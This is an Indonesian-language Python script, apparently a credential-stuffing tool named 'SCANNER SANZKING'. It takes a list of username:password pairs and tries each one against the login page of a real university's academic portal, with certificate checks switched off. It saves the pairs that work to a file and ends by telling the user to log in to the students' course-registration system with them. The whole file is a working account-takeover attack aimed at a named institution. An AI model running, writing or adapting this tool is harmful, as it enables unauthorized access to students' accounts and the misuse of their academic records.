#!/usr/bin/ python3
#Hai kontol, lu mau recode?
import os, time, json, random, platform, urllib.parse, requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor
grey = '\x1b[90m'
red = '\x1b[91m'
green = '\x1b[92m'
yellow = '\x1b[93m'
blue = '\x1b[94m'
purple = '\x1b[95m'
cyan = '\x1b[96m'
white = '\x1b[37m'
flag = '\x1b[47;30m'
off = '\x1b[m'
rv = platform.uname()
me = rv.release
sukses = []
found = []
error = []

def unusa(i, usr, pwd):
    url = 'https://simkuliah.unsyiah.ac.id/index.php/login'
    dat = {'username':usr,  'password':pwd, 
     'submit':'submit'}
    raw = req.post(url, data=dat, verify=False, timeout=10).text
    sta = bs(raw, 'html.parser').h5.get_text()
    if sta == 'Absenkan Mahasiswa':
        print(f"{green}>>> {i}{white} >{green} {usr}{white}:{green}{pwd}")
        found.append(f"{usr}:{pwd}")
        with open('unsyiah.txt', 'a') as (save):
         save.write(f"{usr}:{pwd}\n")
    else:
        print(f"{red}>>> {i}{white} >{red} {usr}{white}:{red}{pwd}")
        error.append(f"{usr}:{pwd}")

def main():
    try:
        os.system('clear')
        print(f"{blue} _ _  _ _  ___  _ _  _  ___  _ _ \n{purple}| | || \ |/ __>| | || || . || | |\n{cyan}| ' ||   |\__ \\ \ / | ||   ||   |\n{off}`___'|_\_|<___/ |_| |_||_|_||_|_|")
        print(f"{flag}         SCANNER SANZKING         {off }")
        time.sleep(0.8)
        print(f"\n{red}[{white}!{red}]{white}List user:pass")
        file = input(f"{green}>>> {white}Input list > ")
        with open(file, 'r') as (f):
            lines = f.readlines()
            count = 1
            print(f"\n{yellow}[{red}✓{yellow}]{white}Terdeteksi ada {red}{len(lines)}{white} akun")
            for line in lines:
                usr = line.strip().split(':')[0]
                pwd = line.strip().split(':')[1]
                unusa(count, usr, pwd)
                count += 1
            else:
                print(f"\n{cyan}>> {white}[{green}Live:{len(found)}{white}] {purple}|{white} [{red}die:{len(error)}{white}]")
                print(f"{purple}>>{white} Akun aktif tersimpan di {purple}unsyiah.txt{off}")
                print(f"{cyan}>> {white}Gunakan akun mahasiswa untuk login pada {green}krsonline{off}")

    except KeyboardInterrupt:
        exit(f"\n{red}>> {white}Keluar script")
    except FileNotFoundError:
        exit(f"{red}>> {white}File tidak ditemukan")
    except IndexError:
        exit(f"{red}>> {white}Maaf format dalam file salah")
    except:
        print(f"\n{red}>> {white}Error:(")

try:
    import requests as req
    from bs4 import BeautifulSoup as bs
except:
    os.system('pip install --upgrade pip')
    os.system('pip install requests bs4')
    exit(f"\n{yellow}>> {white}Bahan sudah diinstall, restart sc")
else:
    if __name__ == '__main__':
        main()
